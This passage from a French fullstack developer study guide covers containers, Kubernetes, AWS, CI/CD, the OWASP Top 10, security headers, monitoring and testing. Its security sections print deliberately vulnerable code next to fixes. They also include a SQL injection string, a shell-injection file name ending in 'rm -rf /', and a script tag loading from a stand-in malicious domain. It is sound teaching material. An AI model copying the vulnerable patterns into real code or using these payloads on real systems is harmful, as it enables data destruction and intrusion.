Orchestre **plusieurs conteneurs** (app + DB + cache Redis, etc.) qui doivent fonctionner ensemble, avec un seul fichier de configuration et une seule commande — évite de lancer manuellement chaque `docker run` avec ses options réseau/volumes.

---

**163. Volumes Docker**

```yaml
volumes:
  - db-data:/var/lib/postgresql/data  # volume nommé, géré par Docker
  - ./local-folder:/app/data           # bind mount, dossier de la machine hôte
```
Par défaut, les données à l'intérieur d'un conteneur sont **perdues** quand celui-ci est supprimé. Un volume persiste les données en dehors du cycle de vie du conteneur — indispensable pour une base de données conteneurisée, sinon toutes les données disparaissent au moindre `docker rm`.

---

**164. Kubernetes — Pod, Deployment, Service, Ingress**

```
Pod        : plus petite unité déployable, contient 1+ conteneur(s) qui partagent réseau/stockage
Deployment : gère un ensemble de Pods identiques, leur nombre (replicas), les mises à jour
Service    : point d'accès réseau stable vers un groupe de Pods (qui, eux, changent d'IP en permanence)
Ingress    : point d'entrée HTTP/HTTPS externe, routage vers différents Services selon l'URL/domaine
```
```yaml
apiVersion: v1
kind: Service
metadata: { name: mon-app-service }
spec:
  selector: { app: mon-app }
  ports: [{ port: 80, targetPort: 3000 }]
```
Les Pods sont éphémères (recréés, IP change) — le Service fournit une adresse stable pour y accéder malgré ça ; l'Ingress ajoute le routage externe (domaines, SSL) au-dessus des Services internes.

---

**165. Helm chart**

Un "gestionnaire de paquets" pour Kubernetes — empaquette un ensemble de fichiers YAML (Deployment, Service, ConfigMap...) en un template réutilisable et paramétrable.

```bash
helm install mon-app ./mon-chart --set replicaCount=3
```
Évite de dupliquer/modifier manuellement des dizaines de fichiers YAML pour chaque environnement (dev/staging/prod) — un chart avec des valeurs paramétrables (`values.yaml`) couvre tous les cas.

---

**166. StatefulSet vs Deployment**

```
Deployment  : Pods interchangeables, identiques, sans identité persistante — idéal pour une app stateless (API web)
StatefulSet : Pods avec identité stable (nom, stockage dédié) qui persiste même après redémarrage — pour des bases de données, systèmes distribués (Kafka, Cassandra)
```
Avec un Deployment, un Pod recréé peut avoir un nom/IP différent sans problème. Avec un StatefulSet, chaque Pod garde son identifiant (`pod-0`, `pod-1`...) et son volume de stockage propre — essentiel quand l'ordre ou l'identité des instances compte (ex: élection de leader dans un cluster DB).

---

**167. Service mesh (Istio)**

Une couche d'infrastructure dédiée à la communication **entre microservices**, indépendante du code applicatif — gère automatiquement : chiffrement mutuel (mTLS) entre services, retry/timeout, load balancing, observabilité (traces automatiques), routage avancé (canary deployment).

```yaml
# Exemple simplifié Istio : router 10% du trafic vers une nouvelle version
- route:
  - destination: { host: mon-service, subset: v2 }
    weight: 10
  - destination: { host: mon-service, subset: v1 }
    weight: 90
```
Utile à partir d'une architecture microservices conséquente (dizaines de services) — sur un monolithe ou quelques services, la complexité ajoutée dépasse généralement le bénéfice.

## Cloud & Hébergement (168-173)

**168. Services AWS principaux**

```
EC2    : machines virtuelles louées (contrôle total du serveur)
S3     : stockage de fichiers/objets (images, backups, sites statiques)
RDS    : base de données relationnelle managée (PostgreSQL, MySQL — AWS gère backups, patchs)
Lambda : fonctions serverless, exécutées à la demande sans gérer de serveur
VPC    : réseau privé isolé où vivent vos ressources AWS (contrôle du trafic entrant/sortant)
```
Cas d'usage typique fullstack : front-end statique sur S3 + CloudFront, API sur EC2 ou Lambda, base de données sur RDS, le tout dans un VPC pour isoler les ressources sensibles du réseau public.

---

**169. AWS S3 et bucket policies**

```json
{
  "Effect": "Allow",
  "Principal": "*",
  "Action": "s3:GetObject",
  "Resource": "arn:aws:s3:::mon-bucket/public/*"
}
```
Un bucket S3 est **privé par défaut**. Une bucket policy (JSON) définit explicitement qui peut faire quoi (lire, écrire, lister) sur quelles ressources.

**Erreur de sécurité très fréquente et médiatisée** : rendre un bucket public par erreur (`Principal: "*"` sur tout le bucket, pas juste un sous-dossier) → fuite de données sensibles. Toujours vérifier le scope exact de la policy avant de la déployer.

---

**170. AWS Lambda et serverless**

```js
exports.handler = async (event) => {
  return { statusCode: 200, body: JSON.stringify({ message: "OK" }) };
};
```
"Serverless" ne veut pas dire "sans serveur" mais "sans gestion de serveur" — le code s'exécute à la demande, facturé à l'exécution (pas de coût si personne n'appelle la fonction).

Avantages : scaling automatique, pas de serveur à maintenir/patcher, coût proportionnel à l'usage réel.
Inconvénients : "cold start" (latence au premier appel après inactivité), durée d'exécution limitée (souvent 15 min max), plus complexe à déboguer/tester localement, coût imprévisible si le trafic explose.

---

**171. CDN**

Un réseau de serveurs répartis géographiquement qui mettent en cache et servent le contenu statique (images, CSS, JS) depuis le serveur **le plus proche** de l'utilisateur.

```
Sans CDN : utilisateur au Cameroun → serveur origine aux USA (latence élevée)
Avec CDN : utilisateur au Cameroun → nœud CDN local/régional (latence faible)
```
Bénéfices : temps de chargement réduit, moins de charge sur le serveur d'origine, protection contre certains pics de trafic (DDoS absorbé en partie par le CDN).

---

**172. Domaine personnalisé et SSL/TLS**

```
1. Acheter un domaine (ex: chez Namecheap, OVH)
2. Pointer les enregistrements DNS (A ou CNAME) vers l'hébergeur
3. Obtenir un certificat SSL (ex: Let's Encrypt, gratuit et automatisé)
4. Configurer le serveur/reverse proxy pour servir en HTTPS
```
```bash
# Let's Encrypt via Certbot
certbot --nginx -d monsite.com
```
La plupart des plateformes modernes (Vercel, Netlify, Cloudflare) automatisent entièrement ce processus — le certificat se renouvelle automatiquement avant expiration (généralement valide 90 jours pour Let's Encrypt).

---

**173. Load balancing**

```
Round-robin    : distribue les requêtes en rotation entre les serveurs
Least connections : envoie vers le serveur avec le moins de connexions actives
IP hash        : même client → toujours le même serveur (utile pour sessions "sticky")
```
Répartit le trafic entrant entre plusieurs instances de l'application pour éviter qu'une seule machine soit surchargée, et permet de retirer un serveur du pool sans interruption de service (ex: pendant une mise à jour).

## CI/CD & Automatisation (174-179)

**174. GitHub Actions — créer un workflow**

```yaml
# .github/workflows/deploy.yml
name: Deploy
on:
  push:
    branches: [main]
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm install && npm run build
      - name: Déployer
        run: ./deploy.sh
        env:
          API_KEY: ${{ secrets.API_KEY }}
```
Un workflow est déclenché par un événement (`push`, `pull_request`, planifié via `cron`), exécute une série de `jobs` (parallélisables), chacun composé de `steps` séquentiels.

---

**175. Continuous Delivery vs Continuous Deployment**

```
Continuous Delivery  : le code est TOUJOURS prêt à être déployé, mais la mise en prod nécessite une action manuelle (bouton "Deploy")
Continuous Deployment : chaque commit validé est déployé AUTOMATIQUEMENT en production, sans intervention humaine
```
Continuous Deployment va plus loin — nécessite une confiance très élevée dans la suite de tests automatisés, car aucun humain ne valide avant la mise en ligne réelle.

---

**176. Artifact dans un pipeline CI/CD**

Un fichier produit par une étape du pipeline (build compilé, image Docker, bundle JS) et réutilisé par les étapes suivantes, sans avoir à le régénérer.

```yaml
- name: Build
  run: npm run build
- uses: actions/upload-artifact@v4
  with: { name: dist, path: ./dist }
# Job suivant (ex: deploy) télécharge cet artifact au lieu de rebuilder
```
Utile pour séparer "build" et "deploy" en jobs distincts, garantissant que ce qui est déployé est **exactement** ce qui a été testé, sans re-build potentiellement différent.

---

**177. Gérer les secrets en CI/CD**

```yaml
env:
  DATABASE_URL: ${{ secrets.DATABASE_URL }}
```
Les secrets (clés API, mots de passe DB) sont stockés chiffrés dans la plateforme CI (GitHub Secrets, GitLab CI/CD Variables), **jamais dans le code source ou le fichier YAML en clair**. Ils sont injectés comme variables d'environnement uniquement au moment de l'exécution, et masqués automatiquement dans les logs si affichés par erreur.

---

**178. Blue-green et canary deployment**

```
Blue-green : deux environnements identiques (Blue = actuel, Green = nouvelle version)
             → bascule instantanée du trafic vers Green une fois validé, rollback immédiat possible

Canary     : la nouvelle version reçoit d'abord un petit % du trafic (ex: 5%)
             → si aucune erreur détectée, augmentation progressive jusqu'à 100%
```
Blue-green = rollback quasi instantané mais nécessite de doubler l'infrastructure temporairement. Canary = détection de problèmes avant impact massif, mais plus complexe à mettre en place (routage progressif, monitoring des deux versions en parallèle).

Terraform maintient un fichier d'état (`terraform.tfstate`) qui représente l'infrastructure réelle actuelle, et calcule le différentiel nécessaire pour atteindre l'état décrit dans le code — permet de détecter et corriger une dérive (drift) entre ce qui est déclaré et ce qui existe réellement en production.

## A01:2025 — Broken Access Control (Contrôle d'accès défaillant)

Un utilisateur peut agir en dehors des permissions qui lui sont normalement accordées — accéder aux données d'un autre utilisateur, ou à des fonctions réservées à un rôle supérieur.

```js
// VULNÉRABLE — aucune vérification que la commande appartient bien à l'utilisateur connecté
app.get('/commandes/:id', verifierAuth, async (req, res) => {
  const commande = await Commande.findById(req.params.id);
  res.json(commande); // n'importe quel user connecté peut voir la commande de n'importe qui, en changeant juste l'ID dans l'URL
});
```

**Solution :**
```js
app.get('/commandes/:id', verifierAuth, async (req, res) => {
  const commande = await Commande.findOne({ _id: req.params.id, userId: req.user.id }); // filtre sur le propriétaire
  if (!commande) return res.status(404).json({ erreur: "Introuvable" });
  res.json(commande);
});
```
- Toujours vérifier la propriété/le rôle **côté serveur**, jamais se fier à ce que le front-end cache ou désactive un bouton.
- Appliquer le principe du moindre privilège (deny by default, autoriser explicitement).
- Ce type de faille inclut aussi le SSRF (Server-Side Request Forgery) depuis 2025 : quand le serveur fait une requête vers une URL fournie par l'utilisateur sans validation, un attaquant peut le forcer à interroger des ressources internes normalement inaccessibles.

## A02:2025 — Security Misconfiguration (Mauvaise configuration de sécurité)

Des paramètres de sécurité laissés par défaut, incomplets, ou mal durcis.

```
Exemples fréquents :
- Messages d'erreur détaillés affichés en production (stack trace exposant la structure du code/DB)
- Comptes/mots de passe par défaut non changés (admin/admin)
- Ports ou services inutiles ouverts
- Headers de sécurité manquants (CSP, X-Frame-Options)
- Permissions cloud trop larges (bucket S3 public par erreur)
```

**Solution :**
```js
// Middleware helmet — configure automatiquement plusieurs headers de sécurité
const helmet = require('helmet');
app.use(helmet());

// Ne jamais exposer les détails d'erreur en production
app.use((err, req, res, next) => {
  const message = process.env.NODE_ENV === 'production' ? "Erreur serveur" : err.message;
  res.status(500).json({ erreur: message });
});
```
- Automatiser le durcissement (checklist de déploiement, scan de configuration).
- Désactiver tout ce qui n'est pas utilisé (endpoints de debug, comptes par défaut).
- Revue régulière des permissions cloud (principe du moindre privilège, jamais de bucket public par défaut).

## A03:2025 — Software Supply Chain Failures (Défaillances de la chaîne d'approvisionnement logicielle) — nouveau

Une compromission dans le processus de construction, distribution ou mise à jour du logiciel — souvent via une dépendance tierce compromise plutôt qu'une faille dans votre propre code.

```
Exemples :
- Un package npm populaire compromis (code malveillant injecté dans une mise à jour)
- Une dépendance transitive (dépendance d'une dépendance) avec une faille connue non patchée
- Une image Docker de base compromise
- Un pipeline CI/CD avec des permissions excessives, piraté pour injecter du code malveillant au build
```

**Solution :**
```bash
npm audit                    # détecte les vulnérabilités connues dans vos dépendances
npm audit fix
```
- Utiliser des outils automatisés (Dependabot, Snyk) qui alertent et proposent des mises à jour de sécurité.
- Verrouiller les versions exactes (`package-lock.json`) pour éviter qu'une mise à jour automatique introduise du code compromis.
- Vérifier la provenance des packages (signatures, SBOM — Software Bill of Materials) avant de les intégrer à un projet critique.
- Limiter les permissions des pipelines CI/CD (principe du moindre privilège sur les tokens/secrets utilisés au build).

## A04:2025 — Cryptographic Failures (Défaillances cryptographiques)

Données sensibles mal protégées : non chiffrées, chiffrées avec un algorithme faible/obsolète, ou clés mal gérées.

```js
// VULNÉRABLE — mot de passe en clair, algorithme faible pour du sensible
const hash = crypto.createHash('md5').update(motDePasse).digest('hex'); // MD5 est cassé, pas conçu pour les mots de passe
```

**Solution :**
```js
// bcrypt est conçu spécifiquement pour le hashing de mots de passe (lent volontairement, résiste au brute-force)
const hash = await bcrypt.hash(motDePasse, 12);

// Pour des données à chiffrer (pas hasher) et déchiffrer plus tard
const algo = 'aes-256-gcm'; // algorithme moderne, pas DES ou RC4
```
- Toujours HTTPS/TLS pour les données en transit (jamais de mot de passe ou token en clair sur le réseau).
- Chiffrer les données sensibles au repos (base de données, backups).
- Ne jamais implémenter son propre algorithme de cryptographie — utiliser des librairies éprouvées (bcrypt, argon2, AES via des libs maintenues).
- Gérer les clés séparément du code (variables d'environnement, gestionnaire de secrets type AWS KMS/Vault), jamais commitées dans Git.

## A05:2025 — Injection

Des données non fiables interprétées comme du code exécutable par un interpréteur (SQL, NoSQL, commande système, LDAP).

```js
// SQL Injection
db.query(`SELECT * FROM users WHERE email = '${email}'`); // ' OR '1'='1 casse la requête

// Injection de commande système — encore plus dangereux
exec(`convert ${nomFichier} sortie.png`); // nomFichier = "; rm -rf / ;" exécute une commande arbitraire
```

**Solution :**
```js
// Requêtes préparées/paramétrées — jamais de concaténation de string
db.query('SELECT * FROM users WHERE email = $1', [email]);

// Pour les commandes système, éviter exec() avec input utilisateur ; utiliser execFile() avec arguments séparés
execFile('convert', [nomFichier, 'sortie.png']); // pas d'interprétation shell
```
- Toujours utiliser des requêtes paramétrées/préparées, jamais de concaténation de chaînes avec des données utilisateur.
- Valider et filtrer strictement les entrées (whitelist plutôt que blacklist).
- Utiliser un ORM qui échappe automatiquement, en évitant ses fonctions de requête "brute" non paramétrées.

## A06:2025 — Insecure Design (Conception non sécurisée)

Des failles issues de choix architecturaux/de conception, pas seulement d'un bug d'implémentation — la sécurité n'a pas été pensée dès la conception (pas de "threat modeling" en amont).

```
Exemple : un système de réinitialisation de mot de passe qui envoie le NOUVEAU mot de passe par email en clair,
au lieu d'un lien à usage unique et limité dans le temps — le design lui-même est dangereux, peu importe l'implémentation.
```

**Solution :**
- Intégrer la sécurité dès la phase de conception ("Security by Design"), pas comme un ajout après coup.
- Threat modeling : identifier les scénarios d'attaque possibles avant de coder (qui pourrait vouloir attaquer ce flux, et comment).
- Utiliser des patterns de conception éprouvés pour les flux sensibles (auth, paiement) plutôt que de réinventer une logique maison.
- Limiter les ressources par design (ex: limite de tentatives, quotas) pour réduire l'impact d'un abus même non anticipé précisément.

## A07:2025 — Authentication Failures (Défaillances d'authentification)

Mécanismes d'identification de l'utilisateur mal implémentés — permet l'usurpation d'identité.

```
Exemples :
- Pas de limite de tentatives de connexion (brute-force possible)
- Mots de passe faibles autorisés
- Session qui n'expire jamais
- ID de session prévisible ou exposé dans l'URL
```

**Solution :**
```js
const rateLimit = require('express-rate-limit');
app.use('/login', rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })); // limite le brute-force

// Politique de mot de passe minimale + 2FA
if (motDePasse.length < 12) throw new Error("Mot de passe trop court");
```
- Rate limiting sur les endpoints d'authentification.
- Authentification à deux facteurs (2FA) disponible, voire obligatoire pour les comptes sensibles.
- Sessions avec expiration raisonnable, régénération de l'ID de session après connexion (évite le "session fixation").
- Cookies de session avec `httpOnly`, `secure`, `SameSite`.

## A08:2025 — Software or Data Integrity Failures (Défaillances d'intégrité logicielle ou des données)

Du code ou des données modifiés sans vérification de leur intégrité — inclut les mises à jour automatiques non vérifiées, la désérialisation non sécurisée.

```js
// VULNÉRABLE — désérialisation de données non fiables sans validation
const objet = eval(donneesUtilisateur); // exécute potentiellement du code arbitraire !

// Mise à jour applicative téléchargée sans vérifier sa signature/checksum
```

**Solution :**
```js
// Utiliser JSON.parse (pas de code exécutable), jamais eval()
const objet = JSON.parse(donneesUtilisateur);
```
- Ne jamais désérialiser des données non fiables avec des mécanismes qui peuvent exécuter du code (`eval`, certains désérialiseurs binaires).
- Vérifier les signatures numériques et checksums des mises à jour/dépendances avant de les appliquer.
- Utiliser des pipelines CI/CD avec des étapes de vérification d'intégrité (signatures de commit, artefacts signés).

## A09:2025 — Security Logging and Alerting Failures (Défaillances de journalisation et d'alerte)

Absence ou insuffisance de logs/alertes sur les événements de sécurité — une intrusion peut passer inaperçue pendant des mois.

```
Exemples :
- Aucune trace des tentatives de connexion échouées
- Logs qui n'incluent pas assez de contexte pour investiguer (pas d'IP, pas d'horodatage précis)
- Pas d'alerte automatique en cas d'activité suspecte (ex: 1000 tentatives de connexion en 1 minute)
```

**Solution :**
```js
logger.warn("Échec de connexion", { email, ip: req.ip, timestamp: new Date() });

// Alerte automatique sur seuil anormal
if (tentativesEchouees > 10) {
  alerteSecurite.envoyer(`Activité suspecte détectée pour ${email}`);
}
```
- Logger systématiquement les événements sensibles : connexions (réussies/échouées), changements de permissions, accès à des données sensibles.
- Centraliser les logs (ELK, Datadog) pour pouvoir corréler des événements entre plusieurs services.
- Mettre en place des alertes automatiques sur des seuils anormaux, pas seulement une consultation manuelle a posteriori.

## A10:2025 — Mishandling of Exceptional Conditions (Mauvaise gestion des conditions exceptionnelles) — nouveau

Une gestion insuffisante ou incorrecte des erreurs/exceptions qui mène à un comportement imprévisible ou exploitable — par exemple une erreur non gérée qui laisse le système dans un état incohérent, ou qui expose des informations sensibles.

```js
// VULNÉRABLE — une erreur inattendue fait planter tout le processus, ou expose la stack trace au client
app.get('/api/data', (req, res) => {
  const data = traiterDonnees(req.query.input); // si ça throw, crash non géré
  res.json(data);
});
```

**Solution :**
```js
app.get('/api/data', async (req, res) => {
  try {
    const data = await traiterDonnees(req.query.input);
    res.json(data);
  } catch (err) {
    logger.error(err); // log interne complet
    res.status(500).json({ erreur: "Une erreur est survenue" }); // message générique côté client
  }
});

// Gestion globale des rejets de Promise non catchés, pour éviter un crash silencieux du process
process.on('unhandledRejection', (err) => logger.error(err));
```
- Toujours entourer le code pouvant échouer (`try/catch`), y compris l'asynchrone.
- Prévoir explicitement le comportement en cas d'échec (fail securely — ex: refuser l'accès par défaut plutôt que l'autoriser si une vérification échoue silencieusement).
- Ne jamais exposer les détails techniques de l'erreur au client final ; les garder uniquement dans les logs internes.

**182. HTTPS et handshake TLS**

```
1. Client envoie "ClientHello" (versions TLS supportées, algorithmes de chiffrement proposés)
2. Serveur répond avec son certificat + choisit les paramètres de chiffrement
3. Client vérifie le certificat (signé par une autorité de confiance)
4. Échange de clés (souvent via Diffie-Hellman) → génération d'une clé de session symétrique partagée
5. Toute la communication qui suit est chiffrée avec cette clé symétrique (plus rapide que l'asymétrique)
```
HTTPS = HTTP + TLS. Le certificat garantit à la fois le **chiffrement** (personne ne peut lire les données en transit) et l'**authenticité** (vous parlez bien au vrai serveur, pas à un attaquant en "man-in-the-middle").

**183. Attaque par force brute**

Un attaquant teste automatiquement de nombreuses combinaisons (mots de passe, tokens) jusqu'à en trouver une valide.

```js
// Protection : rate limiting + verrouillage progressif
const rateLimit = require('express-rate-limit');
app.use('/login', rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: "Trop de tentatives, réessayez plus tard"
}));
```
Autres protections : CAPTCHA après plusieurs échecs, verrouillage temporaire du compte, exiger des mots de passe suffisamment complexes (rendant l'espace de recherche trop grand pour un brute-force pratique), 2FA (même un mot de passe trouvé ne suffit plus).

**184. Rate limiting**

```js
const rateLimit = require('express-rate-limit');

const limiteur = rateLimit({
  windowMs: 60 * 1000, // fenêtre de 1 minute
  max: 100,             // 100 requêtes max par IP dans cette fenêtre
  standardHeaders: true, // renvoie les infos de quota dans les headers HTTP
  message: { erreur: "Trop de requêtes, réessayez dans une minute" }
});

app.use('/api/', limiteur); // appliqué à toute l'API
app.use('/api/login', rateLimit({ windowMs: 15*60*1000, max: 5 })); // plus strict sur login
```
Protège contre le brute-force, le scraping abusif, et les pics de charge (volontaires ou non) qui pourraient saturer le serveur. Bonne pratique : limites différenciées selon la sensibilité de la route (login plus strict qu'une simple lecture publique).

**185. Content Security Policy (CSP)**

Un header HTTP qui indique au navigateur quelles sources de contenu (scripts, styles, images) sont autorisées à s'exécuter — réduit fortement l'impact d'une faille XSS même si elle existe.

```js
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy',
    "default-src 'self'; script-src 'self' https://cdn.trusted.com; style-src 'self' 'unsafe-inline'"
  );
  next();
});
```
Avec cette policy, même si un attaquant réussit à injecter `<script src="https://malveillant.com/x.js">`, le navigateur **refuse de le charger** car ce domaine n'est pas dans la liste blanche `script-src`.

---

**186. Honeypot**

Un leurre volontairement vulnérable (faux formulaire, faux endpoint, fausse ressource) déployé pour attirer et détecter les attaquants sans risque réel.

```html
<!-- Champ invisible pour les humains, mais rempli automatiquement par les bots de spam -->
<input type="text" name="site_web" style="display:none" tabindex="-1" autocomplete="off">
```
```js
app.post('/contact', (req, res) => {
  if (req.body.site_web) return res.status(400).send("Spam détecté"); // un bot a rempli le champ caché
  // traitement normal
});
```
Cas d'usage : anti-spam simple sur formulaires, ou en cybersécurité plus large, systèmes factices déployés pour observer les techniques d'attaquants réels sans exposer de vraies données.

---

**187. Chaîne d'approvisionnement logicielle et sécurisation des dépendances**

```bash
npm audit                 # scan les vulnérabilités connues
npm audit fix              # applique les correctifs disponibles automatiquement
```
- **Dependabot** (GitHub) : ouvre automatiquement des PR quand une dépendance a une faille connue et qu'un correctif existe.
- **Snyk** : scan plus approfondi (dépendances directes et transitives), intégrable au pipeline CI/CD pour bloquer un build si une faille critique est détectée.

Bonnes pratiques : mettre à jour régulièrement (pas seulement en cas d'urgence), limiter le nombre de dépendances (chaque ajout est une surface d'attaque supplémentaire), vérifier la réputation/maintenance active d'un package avant de l'adopter.

**188. Authentification à deux facteurs (2FA)**

Combine deux catégories de preuve : quelque chose que vous **savez** (mot de passe) + quelque chose que vous **possédez** (téléphone, app d'authentification) ou **êtes** (biométrie).

```js
const speakeasy = require('speakeasy');

// Génération du secret à l'inscription (affiché en QR code pour Google Authenticator)
const secret = speakeasy.generateSecret();

// Vérification du code à 6 chiffres saisi par l'utilisateur
const estValide = speakeasy.totp.verify({
  secret: secret.base32,
  encoding: 'base32',
  token: req.body.code,
  window: 1 // tolérance de décalage temporel
});
```
Même si un mot de passe est volé (phishing, fuite de données), l'attaquant ne peut pas se connecter sans le second facteur — réduit drastiquement le risque de prise de contrôle de compte.

## Logging & Monitoring (189-193)

**189. Logging structuré (JSON)**

```js
// Non structuré — difficile à parser/rechercher automatiquement
console.log(`Erreur connexion DB à ${new Date()} pour user ${userId}`);

// Structuré — facilement interrogeable par un outil (Elasticsearch, Datadog)
logger.error({ event: "db_connection_failed", userId, timestamp: Date.now(), env: "production" });
```
Un log structuré permet des requêtes précises ("tous les échecs de connexion DB pour cet utilisateur cette semaine") au lieu de recherches textuelles fragiles sur du texte libre — essentiel dès que le volume de logs dépasse ce qu'un humain peut lire manuellement.

---

**190. ELK Stack**

```
Elasticsearch : moteur de recherche/stockage indexé des logs
Logstash      : collecte, transforme et envoie les logs vers Elasticsearch
Kibana        : interface de visualisation et de recherche dans les logs
```
```
Flux typique : App → Logstash (parse le format JSON) → Elasticsearch (indexe) → Kibana (dashboard/recherche)
```
Utile pour centraliser les logs de **plusieurs services/serveurs** en un seul endroit interrogeable, plutôt que de se connecter à chaque machine individuellement pour lire des fichiers de logs locaux.

---

**191. Prometheus et Grafana**

```
Prometheus : collecte des métriques numériques dans le temps (CPU, mémoire, requêtes/sec, latence)
             via un modèle "pull" (interroge périodiquement chaque service)
Grafana    : visualise ces métriques sous forme de dashboards, avec alertes configurables
```
```js
// Exposer une métrique custom pour Prometheus
const promClient = require('prom-client');
const compteurRequetes = new promClient.Counter({ name: 'http_requests_total', help: 'Total requêtes' });
app.use((req, res, next) => { compteurRequetes.inc(); next(); });
```
Différence avec les logs (ELK) : les métriques sont des **valeurs numériques agrégées dans le temps** (tendances, seuils), les logs sont des **événements discrets détaillés** — complémentaires, pas interchangeables.

**192. Health check**

Un endpoint qui indique si le service est opérationnel, utilisé par les load balancers/orchestrateurs pour décider s'il faut router du trafic vers cette instance.

```js
app.get('/health', async (req, res) => {
  try {
    await db.query('SELECT 1'); // vérifie que la DB répond
    res.status(200).json({ statut: "ok" });
  } catch {
    res.status(503).json({ statut: "indisponible" }); // signale à Kubernetes/LB de ne pas router ici
  }
});
```
Kubernetes distingue souvent **liveness probe** (le process est-il vivant, sinon redémarrer le Pod) et **readiness probe** (le service est-il prêt à recevoir du trafic, ex: connexions DB établies) — deux endpoints avec une logique parfois différente.

**193. Tracing distribué (Jaeger, Zipkin)**

Dans une architecture microservices, une seule requête utilisateur peut traverser 5-10 services — le tracing distribué suit cette requête de bout en bout avec un identifiant unique partagé.

```js
// Chaque service propage le même trace ID dans les headers
app.use((req, res, next) => {
  req.traceId = req.headers['x-trace-id'] || generateId();
  res.setHeader('x-trace-id', req.traceId);
  next();
});
```
```
Requête → Service Auth (12ms) → Service Commandes (45ms) → Service Paiement (230ms) ← goulot d'étranglement visible ici
```
Sans tracing, diagnostiquer "pourquoi cette requête a pris 3 secondes" dans un système à 10 microservices revient à chercher à l'aveugle — le tracing montre visuellement quel service précis est responsable du délai.

## Tests Unitaires & Intégration (194-199)

**194. Test unitaire (Jest)**

Teste **une seule unité de code** (fonction, méthode) de façon isolée, sans dépendances externes réelles.

```js
// addition.js
function addition(a, b) { return a + b; }
module.exports = addition;

// addition.test.js
const addition = require('./addition');

test('addition(2, 3) retourne 5', () => {
  expect(addition(2, 3)).toBe(5);
});

test('addition avec des négatifs', () => {
  expect(addition(-1, -1)).toBe(-2);
});
```
```bash
npx jest
```
Caractéristiques clés : rapide (millisecondes), pas d'appel réseau/DB réel, facile à isoler la cause d'un échec (un seul comportement testé à la fois).

---

**195. Mocking**

Remplacer une dépendance réelle (API, DB, service externe) par une version simulée et contrôlable, pour isoler le test de tout élément externe imprévisible.

```js
// Sans mock — dépend d'un vrai appel réseau, lent et fragile (peut échouer si l'API tierce est down)
test('recupererMeteo retourne la température', async () => {
  const meteo = await recupererMeteo('Douala'); // vrai appel HTTP
  expect(meteo.temp).toBeDefined();
});

// Avec mock — rapide, prévisible, isolé
jest.mock('./apiMeteo');
test('recupererMeteo retourne la température', async () => {
  apiMeteo.get.mockResolvedValue({ temp: 28 });
  const meteo = await recupererMeteo('Douala');
  expect(meteo.temp).toBe(28);
});
```
**Quand mocker** : appels réseau, base de données, horloge système (`Date.now()`), tout ce qui rend le test lent, coûteux, ou non déterministe. **Piège** : trop mocker peut masquer de vrais bugs d'intégration — équilibrer avec des tests d'intégration réels sur les points critiques.

---

**196. Test d'intégration vs unitaire**

```js
// Unitaire — la fonction seule, DB mockée
test('validerCommande rejette une quantité négative', () => {
  expect(() => validerCommande({ quantite: -1 })).toThrow();
});

// Intégration — plusieurs couches réelles ensemble (route + DB de test)
test('POST /commandes crée réellement une commande en DB', async () => {
  const res = await request(app).post('/commandes').send({ produit: 'Livre', quantite: 2 });
  expect(res.status).toBe(201);
  const enDB = await Commande.findById(res.body.id); // vérifie que ça a vraiment persisté
  expect(enDB).not.toBeNull();
});
```
Le test d'intégration vérifie que les différentes parties **fonctionnent ensemble** correctement (route, validation, DB), pas juste chaque fonction isolément — attrape des bugs qu'un test unitaire ne peut pas voir (ex: mauvais mapping entre le nom de champ API et la colonne DB).

**197. Code coverage**

```bash
npx jest --coverage
```
```
File          | % Stmts | % Branch | % Funcs | % Lines
addition.js   |   100   |    100   |   100   |   100
validation.js |    65   |     40   |    70   |    65
```
Mesure quel pourcentage du code est **exécuté** par les tests (lignes, branches conditionnelles, fonctions).

**Piège classique** : viser 100% de couverture n'est pas forcément un bon objectif — un test peut "exécuter" une ligne sans réellement vérifier son comportement (`expect(true).toBe(true)` couvre la ligne mais ne teste rien d'utile). La couverture indique ce qui n'est **pas** testé, pas la qualité de ce qui l'est.

**198. TDD en pratique**

```js
// 1. RED — écrire le test avant le code (échoue car estPalindrome n'existe pas encore)
test('estPalindrome("radar") retourne true', () => {
  expect(estPalindrome('radar')).toBe(true);
});

// 2. GREEN — code minimal pour passer le test
function estPalindrome(str) {
  return str === str.split('').reverse().join('');
}

// 3. REFACTOR — améliorer si besoin (ex: gérer la casse, les espaces) en ajoutant d'abord un nouveau test
test('estPalindrome ignore la casse', () => {
  expect(estPalindrome('Radar')).toBe(true); // échoue avec l'implémentation actuelle
});
function estPalindrome(str) {
  const propre = str.toLowerCase();
  return propre === propre.split('').reverse().join('');
}
```
Cycle court et répété à chaque nouvelle fonctionnalité — force à définir précisément le comportement attendu avant d'écrire l'implémentation.

**199. BDD avec Cucumber**

Décrit le comportement attendu en langage **quasi naturel**, lisible par des non-développeurs (product owner, testeurs métier).

```gherkin
# fichier .feature
Fonctionnalité: Connexion utilisateur
  Scénario: Connexion avec des identifiants valides
    Étant donné que je suis sur la page de connexion
    Quand je saisis un email et un mot de passe valides
    Alors je suis redirigé vers le tableau de bord
```
```js
// step definition — relie le langage naturel au code exécutable
Quand('je saisis un email et un mot de passe valides', async function() {
  await this.page.fill('#email', 'test@test.com');
  await this.page.fill('#password', 'motdepasse123');
  await this.page.click('#submit');
});
```
Différence avec TDD : TDD se concentre sur "est-ce que le code fonctionne techniquement", BDD sur "est-ce que le comportement correspond au besoin métier" — les deux se combinent bien (BDD au niveau des scénarios utilisateur, TDD au niveau de l'implémentation interne).

## Tests E2E & Performance (200-205)

**200. Test end-to-end (E2E)**

Simule un parcours utilisateur **réel** dans un navigateur, du début à la fin, sans mocker aucune couche.

```js
// Cypress
it('un utilisateur peut se connecter et voir son profil', () => {
  cy.visit('/login');
  cy.get('#email').type('test@test.com');
  cy.get('#password').type('motdepasse123');
  cy.get('#submit').click();
  cy.url().should('include', '/dashboard');
  cy.contains('Bienvenue');
});
```
Outils : **Cypress** (populaire, API simple, tourne dans le navigateur), **Playwright** (multi-navigateurs, très rapide, par Microsoft), **Selenium** (le plus ancien, très flexible mais plus verbeux).

Les E2E sont les tests les plus **lents et fragiles** (dépendent de timing, de l'état de la DB) mais couvrent le parcours réel de bout en bout, contrairement aux tests unitaires/intégration.

---

**201. Cypress vs Selenium**

```
Cypress    : tourne DANS le navigateur (même processus), attentes automatiques intelligentes,
             debug facile (time-travel dans l'UI), mais limité à Chromium/Firefox historiquement
